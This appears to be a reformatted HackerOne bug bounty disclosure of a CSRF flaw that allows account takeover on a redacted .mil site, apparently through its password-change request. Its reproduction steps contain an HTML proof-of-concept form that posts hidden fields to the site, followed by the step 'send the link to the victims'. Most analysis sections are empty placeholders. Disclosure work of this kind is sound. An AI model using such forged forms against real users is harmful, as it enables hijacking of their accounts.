# CSRF to account takeover in https://███████.mil/

## Metadata
- **Source:** HackerOne
- **Report:** 987751 | https://hackerone.com/reports/987751
- **Submitted:** 2020-09-22
- **Reporter:** dhakal_bibek
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** critical
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
**Summary:**
Hello 
**Description:**

## Impact

## Step-by-step Reproduction Instructions

1. Go to  https://███.mil/ and login using your credintials
2. Now Click on change password
3. First turn the intercept of burp to on and enter your secondary email id and password and click on register password.

```
<html>
  <!-- CSRF PoC - kira-->
  <body>
  <script>history.pushState('', '', '/')</script

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**
Hello 
**Description:**

## Impact

## Step-by-step Reproduction Instructions

1. Go to  https://███.mil/ and login using your credintials
2. Now Click on change password
3. First turn the intercept of burp to on and enter your secondary email id and password and click on register password.

```
<html>
  <!-- CSRF PoC - kira-->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://████████.mil/scripts/wa.exe" method="POST">
      <input type="hidden" name="GETPW2" value="GETPW1" />
      <input type="hidden" name="Y" value="a█████" />
      <input type="hidden" name="p" value="████████" />
      <input type="hidden" name="q" value="███████" />
      <input type="hidden" name="X" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

4: Now send the link to the victims
## Product, Version, and Configuration (If applicable)

██████

## Impact

It is a critical issue as i was able to takeover anyone account using this attack..

</details>

---
*Analysed by Claude on 2026-05-24*
